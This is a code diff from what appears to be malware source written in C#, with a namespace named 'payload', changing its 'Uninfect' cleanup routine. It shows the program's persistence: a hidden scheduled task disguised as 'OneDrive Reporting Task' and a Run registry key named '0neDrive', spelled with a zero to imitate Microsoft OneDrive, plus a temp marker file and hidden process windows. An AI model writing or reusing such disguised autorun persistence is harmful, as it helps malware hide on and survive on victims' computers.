@@ -5,7 +5,7 @@ using System.Globalization;
 using System.IO;
 using System.IO.Compression;
 using System.Net;
-
+using Microsoft.Win32;
 using Newtonsoft.Json;
 
 namespace payload
@@ -63,14 +63,10 @@ namespace payload
 
         public static void Uninfect()
         {
-            File.Delete(Path.GetTempPath() + "\\wello.tmp");
-            Process.Start(new ProcessStartInfo()
-            {
-                FileName = "schtasks.exe",
-                Arguments = "/delete /tn \"OneDrive Reporting Task\" /f",
-                UseShellExecute = true,
-                WindowStyle = ProcessWindowStyle.Hidden
-            }).WaitForExit();
+            File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\wello.tmp");
+            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
+            key.DeleteValue("0neDrive");
+            key.Dispose();
             Process.Start(new ProcessStartInfo()
             {
                 FileName = "taskkill.exe",
